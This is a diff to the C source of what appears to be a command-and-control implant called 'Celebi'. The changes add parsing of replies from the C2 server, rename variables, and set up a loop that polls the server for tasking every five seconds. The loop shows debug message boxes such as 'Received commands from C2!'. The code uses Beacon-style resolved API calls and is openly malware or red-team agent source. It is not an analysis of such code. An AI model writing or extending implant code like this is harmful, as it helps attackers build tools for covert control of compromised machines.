@@ -55,7 +55,7 @@ void perform_checkin(AgentParams *params, CheckinReply *reply, HttpHandle *http)
 	
 }
 
-void perform_tasking(AgentParams *params, HttpHandle *http) {
+void perform_tasking(AgentParams *params, TaskingReply *reply, HttpHandle *http) {
 	// Generate tasking payload.
 	TaskingRequest tasking = { 0 };
 	tasking.callback_uuid = params->callback_uuid;
@@ -71,7 +71,7 @@ void perform_tasking(AgentParams *params, HttpHandle *http) {
 	
 	// If we get a 200 response code, parse the reply.
 	if (response.status_code == 200) {
-		// TODO
+		parse_tasking_reply(&response, reply);
 	}
 	
 	// Free unneeded allocations.
@@ -83,31 +83,36 @@ void perform_tasking(AgentParams *params, HttpHandle *http) {
 void go() {
 	HttpHandle *http;
 	AgentParams params = { 0 };
-	CheckinReply reply = { 0 };
+	CheckinReply checkin_reply = { 0 };
 	
 	unpack_params(RAW_PARAMS, &params);
 	
 	http = HttpInit(params.callback_https);
 	
-	perform_checkin(&params, &reply, http);
+	perform_checkin(&params, &checkin_reply, http);
 	
-	if ((reply.status == NULL) || (MSVCRT$strcmp(reply.status, "success") != 0)) {
+	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
 		free_params(&params);
-		free_checkin_reply(&reply);
+		free_checkin_reply(&checkin_reply);
 		USER32$MessageBoxA(NULL, "Checkin failed :(", "Celebi", MB_OKCANCEL);
 		return;
 	}
 	
 	USER32$MessageBoxA(NULL, "Successful Checkin!", "Celebi", MB_OKCANCEL);
-	params.callback_uuid = reply.callback_uuid;
+	params.callback_uuid = checkin_reply.callback_uuid;
 	
 	while (1) {
 		// Look ma, no masking!
-		perform_tasking(&params, http);
+		TaskingReply tasking_reply = { 0 };
+		perform_tasking(&params, &tasking_reply, http);
+		
+		USER32$MessageBoxA(NULL, "Received commands from C2!", "Celebi", MB_OKCANCEL);
+		
+		free_tasking_reply(&tasking_reply);
 		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
 	}
 
 	HttpDestroy(http);
 	free_params(&params);
-	free_checkin_reply(&reply);
+	free_checkin_reply(&checkin_reply);
 }
